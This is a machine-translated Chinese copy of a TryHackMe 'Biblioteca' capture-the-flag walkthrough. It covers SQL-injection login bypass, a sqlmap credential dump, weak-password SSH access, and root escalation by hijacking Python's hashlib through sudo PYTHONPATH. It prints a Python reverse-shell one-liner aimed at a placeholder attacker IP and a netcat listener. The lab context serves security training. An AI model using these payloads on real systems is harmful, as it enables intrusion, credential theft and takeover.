<html>
<head>
<title>TryHackMe: Biblioteca</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe: Biblioteca</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/tryhackme-biblioteca-c56be949564c?source=collection_archive---------0-----------------------#2022-05-21">https://infosecwriteups.com/tryhackme-biblioteca-c56be949564c?source=collection_archive---------0-----------------------#2022-05-21</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="a10f" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">走查</h2></div><h1 id="3edf" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">介绍</h1><p id="13da" class="pw-post-body-paragraph kx ky iq kz b la lb jr lc ld le ju lf lg lh li lj lk ll lm ln lo lp lq lr ls ij bi translated">嘿伙计们！这一次，让我们来根<strong class="kz ir"> TryHackMe </strong>中被评为<strong class="kz ir">中等</strong>(难度)的<strong class="kz ir"> Biblioteca </strong>房间。我们加油吧！</p><figure class="lu lv lw lx gt ly gh gi paragraph-image"><div class="gh gi lt"><img src="../Images/ef5a8db873246221ce5e04c3a217b673.png" data-original-src="https://miro.medium.com/v2/resize:fit:1240/format:webp/1*ruqFUGzYnzS0tnhkWbC_zQ.png"/></div></figure></div><div class="ab cl mb mc hu md" role="separator"><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg"/></div><div class="ij ik il im in"><h1 id="44c4" class="kf kg iq bd kh ki mi kk kl km mj ko kp jw mk jx kr jz ml ka kt kc mm kd kv kw bi translated">首字母</h1><pre class="lu lv lw lx gt mn mo mp mq aw mr bi"><span id="2c77" class="ms kg iq mo b gy mt mu l mv mw">export IP=&lt;your_IP&gt;</span></pre><h2 id="3785" class="ms kg iq bd kh mx my dn kl mz na dp kp lg nb nc kr lk nd ne kt lo nf ng kv nh bi translated">列举</h2><p id="0763" class="pw-post-body-paragraph kx ky iq kz b la lb jr lc ld le ju lf lg lh li lj lk ll lm ln lo lp lq lr ls ij bi translated">让我们从端口扫描开始:</p><pre class="lu lv lw lx gt mn mo mp mq aw mr bi"><span id="fd93" class="ms kg iq mo b gy mt mu l mv mw">rustscan -a $IP --ulimit 5000 | tee rustscan.txt</span></pre><p id="c925" class="pw-post-body-paragraph kx ky iq kz b la ni jr lc ld nj ju lf lg nk li lj lk nl lm ln lo nm lq lr ls ij bi translated">通过rustscan我们了解到有两个开放的端口，即22 ( <strong class="kz ir"> ssh </strong>)和8000 ( <strong class="kz ir"> http </strong>)。</p><p id="25e5" class="pw-post-body-paragraph kx ky iq kz b la ni jr lc ld nj ju lf lg nk li lj lk nl lm ln lo nm lq lr ls ij bi translated">让我们深入这些港口。</p><pre class="lu lv lw lx gt mn mo mp mq aw mr bi"><span id="e97d" class="ms kg iq mo b gy mt mu l mv mw">nmap -sC -sV -p22,8000 -Pn -oN nmap $IP</span></pre><figure class="lu lv lw lx gt ly gh gi paragraph-image"><div role="button" tabindex="0" class="no np di nq bf nr"><div class="gh gi nn"><img src="../Images/0484eb600590ff00e11576740a0f9bb5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pIqfRUxT1S2oIJAjDGM_fg.png"/></div></div><figcaption class="ns nt gj gh gi nu nv bd b be z dk translated">nmap扫描结果</figcaption></figure><p id="9e9e" class="pw-post-body-paragraph kx ky iq kz b la ni jr lc ld nj ju lf lg nk li lj lk nl lm ln lo nm lq lr ls ij bi translated">我检查了端口8000，因为我没有任何ssh凭证:)</p><h2 id="d167" class="ms kg iq bd kh mx my dn kl mz na dp kp lg nb nc kr lk nd ne kt lo nf ng kv nh bi translated">端口8000:</h2><p id="93c8" class="pw-post-body-paragraph kx ky iq kz b la lb jr lc ld le ju lf lg lh li lj lk ll lm ln lo lp lq lr ls ij bi translated">在访问http站点时，有一个登录页面</p><figure class="lu lv lw lx gt ly gh gi paragraph-image"><div class="gh gi nw"><img src="../Images/56636d5381e4c80d04577a353d6a9955.png" data-original-src="https://miro.medium.com/v2/resize:fit:1396/format:webp/1*KREP9Z47BDhPmubhEOx8Yw.png"/></div><figcaption class="ns nt gj gh gi nu nv bd b be z dk translated">登录页面</figcaption></figure><p id="5132" class="pw-post-body-paragraph kx ky iq kz b la ni jr lc ld nj ju lf lg nk li lj lk nl lm ln lo nm lq lr ls ij bi translated">我创建了一个帐户并登录</p><figure class="lu lv lw lx gt ly gh gi paragraph-image"><div class="gh gi nx"><img src="../Images/0073064a40fdcd95f4b791423149fa18.png" data-original-src="https://miro.medium.com/v2/resize:fit:1326/format:webp/1*32BIY0GbDwyeQlyZZPanVQ.png"/></div></figure><p id="0881" class="pw-post-body-paragraph kx ky iq kz b la ni jr lc ld nj ju lf lg nk li lj lk nl lm ln lo nm lq lr ls ij bi translated">什么都没有，很可疑。</p><p id="b89f" class="pw-post-body-paragraph kx ky iq kz b la ni jr lc ld nj ju lf lg nk li lj lk nl lm ln lo nm lq lr ls ij bi translated">我运行了<strong class="kz ir"> gobuster </strong>扫描，但没有得到任何其他页面。</p><p id="785e" class="pw-post-body-paragraph kx ky iq kz b la ni jr lc ld nj ju lf lg nk li lj lk nl lm ln lo nm lq lr ls ij bi translated">然后我试了一下<strong class="kz ir"> SQLi </strong>，你猜怎么着？成功了</p><figure class="lu lv lw lx gt ly gh gi paragraph-image"><div class="gh gi ny"><img src="../Images/84d93ac88dd5cecb66853cfd6966077f.png" data-original-src="https://miro.medium.com/v2/resize:fit:930/format:webp/1*hCcrGL_i21foEZq2w0Q2Zw.png"/></div></figure><p id="917a" class="pw-post-body-paragraph kx ky iq kz b la ni jr lc ld nj ju lf lg nk li lj lk nl lm ln lo nm lq lr ls ij bi translated">我在<strong class="kz ir">密码栏</strong>即<code class="fe nz oa ob mo b">'or 1=1 -- —</code>中尝试了简单的有效载荷，我们登录了其他一些名为<strong class="kz ir">斯莫奇</strong>的用户账户！</p><figure class="lu lv lw lx gt ly gh gi paragraph-image"><div class="gh gi oc"><img src="../Images/00bbc247bc0d98db7d79e9aee0b91d51.png" data-original-src="https://miro.medium.com/v2/resize:fit:942/format:webp/1*sDA5D8cXqrPw_NbExH_oDw.png"/></div><figcaption class="ns nt gj gh gi nu nv bd b be z dk translated">smokey帐户已登录</figcaption></figure></div><div class="ab cl mb mc hu md" role="separator"><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg"/></div><div class="ij ik il im in"><h1 id="a23e" class="kf kg iq bd kh ki mi kk kl km mj ko kp jw mk jx kr jz ml ka kt kc mm kd kv kw bi translated">利用:</h1><p id="339e" class="pw-post-body-paragraph kx ky iq kz b la lb jr lc ld le ju lf lg lh li lj lk ll lm ln lo lp lq lr ls ij bi translated">我迅速启动了<strong class="kz ir">打嗝套件</strong> →捕获请求→保存请求</p><figure class="lu lv lw lx gt ly gh gi paragraph-image"><div role="button" tabindex="0" class="no np di nq bf nr"><div class="gh gi od"><img src="../Images/cc32e4111fdd5ee39a9513eae1e46669.png" data-original-src="https://miro.medium.com/v2/resize:fit:1214/format:webp/1*pJ_JYgyIh23ry68BO-EGBQ.png"/></div></div><figcaption class="ns nt gj gh gi nu nv bd b be z dk translated">打嗝图像</figcaption></figure><h2 id="9090" class="ms kg iq bd kh mx my dn kl mz na dp kp lg nb nc kr lk nd ne kt lo nf ng kv nh bi translated">sqlmap</h2><pre class="lu lv lw lx gt mn mo mp mq aw mr bi"><span id="c300" class="ms kg iq mo b gy mt mu l mv mw">sqlmap -r sql.req --dbs --dump</span></pre><p id="7004" class="pw-post-body-paragraph kx ky iq kz b la ni jr lc ld nj ju lf lg nk li lj lk nl lm ln lo nm lq lr ls ij bi translated">并且得到了<strong class="kz ir">用户名</strong>、<strong class="kz ir">邮箱</strong>、&amp;、<strong class="kz ir">密码</strong></p><figure class="lu lv lw lx gt ly gh gi paragraph-image"><div class="gh gi oe"><img src="../Images/dc20c87da0c37702d47338286822d892.png" data-original-src="https://miro.medium.com/v2/resize:fit:876/format:webp/1*aexzjZFSv_37jLUkKj3I_w.png"/></div><figcaption class="ns nt gj gh gi nu nv bd b be z dk translated">sqlmap结果</figcaption></figure><p id="4840" class="pw-post-body-paragraph kx ky iq kz b la ni jr lc ld nj ju lf lg nk li lj lk nl lm ln lo nm lq lr ls ij bi translated"><strong class="kz ir"> SSH </strong>用凭证获取用户标志</p><figure class="lu lv lw lx gt ly gh gi paragraph-image"><div class="gh gi of"><img src="../Images/949e3ec95912e1c5270651af41cda268.png" data-original-src="https://miro.medium.com/v2/resize:fit:482/format:webp/1*_iTI9X1tFGMAT8CK_3PRMg.png"/></div></figure><p id="9f04" class="pw-post-body-paragraph kx ky iq kz b la ni jr lc ld nj ju lf lg nk li lj lk nl lm ln lo nm lq lr ls ij bi translated">但是等等，我们没有权限读取<strong class="kz ir"> user.txt </strong>文件，因为所有者是另一个名为<code class="fe nz oa ob mo b">hazel</code>的用户</p><p id="5ba0" class="pw-post-body-paragraph kx ky iq kz b la ni jr lc ld nj ju lf lg nk li lj lk nl lm ln lo nm lq lr ls ij bi translated">在妥协后侦查了一段时间后，我什么也没发现。</p><p id="225f" class="pw-post-body-paragraph kx ky iq kz b la ni jr lc ld nj ju lf lg nk li lj lk nl lm ln lo nm lq lr ls ij bi translated">后来我查了一下TryHackMe官方不和谐频道的一些讨论室，才知道对方用户<code class="fe nz oa ob mo b">hazel's</code>的密码是<strong class="kz ir">非常弱</strong>。</p><p id="136b" class="pw-post-body-paragraph kx ky iq kz b la ni jr lc ld nj ju lf lg nk li lj lk nl lm ln lo nm lq lr ls ij bi translated">起初，我用来自<strong class="kz ir"> Seclists </strong> →的100个常用密码运行hydra</p><p id="2799" class="pw-post-body-paragraph kx ky iq kz b la ni jr lc ld nj ju lf lg nk li lj lk nl lm ln lo nm lq lr ls ij bi translated">然后，我沮丧地输入了用户名密码，它的工作。即密码是用户名(<strong class="kz ir"> hazel:hazel </strong>)</p><p id="8dfb" class="pw-post-body-paragraph kx ky iq kz b la ni jr lc ld nj ju lf lg nk li lj lk nl lm ln lo nm lq lr ls ij bi translated">现在我拿到了<strong class="kz ir"> user.txt </strong></p><figure class="lu lv lw lx gt ly gh gi paragraph-image"><div class="gh gi og"><img src="../Images/b0d672de3fade9d5c121a6eaa13d679c.png" data-original-src="https://miro.medium.com/v2/resize:fit:752/format:webp/1*yjZRsenrPKyfwbN4AZR00Q.png"/></div></figure></div><div class="ab cl mb mc hu md" role="separator"><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg"/></div><div class="ij ik il im in"><h1 id="3311" class="kf kg iq bd kh ki mi kk kl km mj ko kp jw mk jx kr jz ml ka kt kc mm kd kv kw bi translated">特权:</h1><p id="c734" class="pw-post-body-paragraph kx ky iq kz b la lb jr lc ld le ju lf lg lh li lj lk ll lm ln lo lp lq lr ls ij bi translated">如果你有用户的密码，首先运行的是<code class="fe nz oa ob mo b">sudo -l</code> :D</p><figure class="lu lv lw lx gt ly gh gi paragraph-image"><div role="button" tabindex="0" class="no np di nq bf nr"><div class="gh gi oh"><img src="../Images/dd5dc7389e1738ed194c3a9d303ce5cd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*yZpKg2VZ5_5ChNm845Lmww.png"/></div></div></figure><p id="fe81" class="pw-post-body-paragraph kx ky iq kz b la ni jr lc ld nj ju lf lg nk li lj lk nl lm ln lo nm lq lr ls ij bi translated">看到了<strong class="kz ir"> SETENV </strong>，这意味着我们可以在以root用户身份运行上述命令时设置环境变量！</p><p id="4251" class="pw-post-body-paragraph kx ky iq kz b la ni jr lc ld nj ju lf lg nk li lj lk nl lm ln lo nm lq lr ls ij bi translated">查看<strong class="kz ir"> hasher.py </strong>文件</p><figure class="lu lv lw lx gt ly gh gi paragraph-image"><div class="gh gi oi"><img src="../Images/ec7785cc7e10b42dc98b72058578a464.png" data-original-src="https://miro.medium.com/v2/resize:fit:1002/format:webp/1*Snc0MnxCoJGL-stcZxayCg.png"/></div></figure><p id="992e" class="pw-post-body-paragraph kx ky iq kz b la ni jr lc ld nj ju lf lg nk li lj lk nl lm ln lo nm lq lr ls ij bi translated">经过一些研究/谷歌搜索，我看到了两篇非常有帮助的博客/文章(链接在最后)。</p><p id="4ed6" class="pw-post-body-paragraph kx ky iq kz b la ni jr lc ld nj ju lf lg nk li lj lk nl lm ln lo nm lq lr ls ij bi translated">有某种类型的<strong class="kz ir"> python库劫持。</strong>总之，要劫持，遵循以下步骤:</p><ol class=""><li id="76fb" class="oj ok iq kz b la ni ld nj lg ol lk om lo on ls oo op oq or bi translated">获取python库(正在使用)的位置，在我们的例子中是它的<em class="os"> /usr/lib/python3.8/ </em></li><li id="20fb" class="oj ok iq kz b la ot ld ou lg ov lk ow lo ox ls oo op oq or bi translated">将<strong class="kz ir"> hashlib.py </strong>文件复制到<em class="os"> /tmp </em></li></ol><pre class="lu lv lw lx gt mn mo mp mq aw mr bi"><span id="79b1" class="ms kg iq mo b gy mt mu l mv mw"><em class="os">cp /usr/lib/python3.8/hashlib.py /tmp/hashlib.py</em></span></pre><p id="a627" class="pw-post-body-paragraph kx ky iq kz b la ni jr lc ld nj ju lf lg nk li lj lk nl lm ln lo nm lq lr ls ij bi translated">3.将<strong class="kz ir">反向外壳</strong>添加到hashlib.py文件中(任何你想要的地方)</p><p id="5101" class="pw-post-body-paragraph kx ky iq kz b la ni jr lc ld nj ju lf lg nk li lj lk nl lm ln lo nm lq lr ls ij bi translated">使用反向外壳:</p><pre class="lu lv lw lx gt mn mo mp mq aw mr bi"><span id="2f90" class="ms kg iq mo b gy mt mu l mv mw">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("your_IP",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")</span></pre><p id="0f3a" class="pw-post-body-paragraph kx ky iq kz b la ni jr lc ld nj ju lf lg nk li lj lk nl lm ln lo nm lq lr ls ij bi translated">4.启动监听器</p><pre class="lu lv lw lx gt mn mo mp mq aw mr bi"><span id="943c" class="ms kg iq mo b gy mt mu l mv mw"><em class="os">nc -lnvp 1234</em></span></pre><p id="040a" class="pw-post-body-paragraph kx ky iq kz b la ni jr lc ld nj ju lf lg nk li lj lk nl lm ln lo nm lq lr ls ij bi translated">5.要获得<strong class="kz ir">外壳</strong>，运行以下命令</p><pre class="lu lv lw lx gt mn mo mp mq aw mr bi"><span id="d0da" class="ms kg iq mo b gy mt mu l mv mw">sudo PYTHONPATH=/tmp/ /usr/bin/python3 /home/hazel/hasher.py</span></pre><blockquote class="oy oz pa"><p id="bba7" class="kx ky os kz b la ni jr lc ld nj ju lf pb nk li lj pc nl lm ln pd nm lq lr ls ij bi translated">PYTHONPATH环境变量指示一个(或多个)目录，Python可以在其中搜索要导入的模块。</p></blockquote><p id="197d" class="pw-post-body-paragraph kx ky iq kz b la ni jr lc ld nj ju lf lg nk li lj lk nl lm ln lo nm lq lr ls ij bi translated">我得到了贝壳。<strong class="kz ir">稳定</strong>外壳，获得<strong class="kz ir"> root.txt </strong>文件</p><figure class="lu lv lw lx gt ly gh gi paragraph-image"><div role="button" tabindex="0" class="no np di nq bf nr"><div class="gh gi pe"><img src="../Images/b61b20008b43928b34b26bf91dd60cc4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*SeD2HpGR2d11c0YALKj4MA.png"/></div></div><figcaption class="ns nt gj gh gi nu nv bd b be z dk translated">根</figcaption></figure></div><div class="ab cl mb mc hu md" role="separator"><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg"/></div><div class="ij ik il im in"><p id="5498" class="pw-post-body-paragraph kx ky iq kz b la ni jr lc ld nj ju lf lg nk li lj lk nl lm ln lo nm lq lr ls ij bi translated">就这样，我们完成了这个房间。</p><p id="37c4" class="pw-post-body-paragraph kx ky iq kz b la ni jr lc ld nj ju lf lg nk li lj lk nl lm ln lo nm lq lr ls ij bi translated">感谢你阅读这篇博客。博客见，到时见<strong class="kz ir"> Happy Hacking o7 </strong></p></div><div class="ab cl mb mc hu md" role="separator"><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg"/></div><div class="ij ik il im in"><p id="250f" class="pw-post-body-paragraph kx ky iq kz b la ni jr lc ld nj ju lf lg nk li lj lk nl lm ln lo nm lq lr ls ij bi translated">|| <a class="ae pf" href="https://tryhackme.com/room/biblioteca" rel="noopener ugc nofollow" target="_blank">房间</a> | <a class="ae pf" href="https://twitter.com/namx05" rel="noopener ugc nofollow" target="_blank">推特</a> | <a class="ae pf" href="https://www.hackingarticles.in/linux-privilege-escalation-python-library-hijacking/" rel="noopener ugc nofollow" target="_blank">博客1 </a> | <a class="ae pf" href="https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8" rel="noopener">博客2 </a> ||</p></div></div>    
</body>
</html>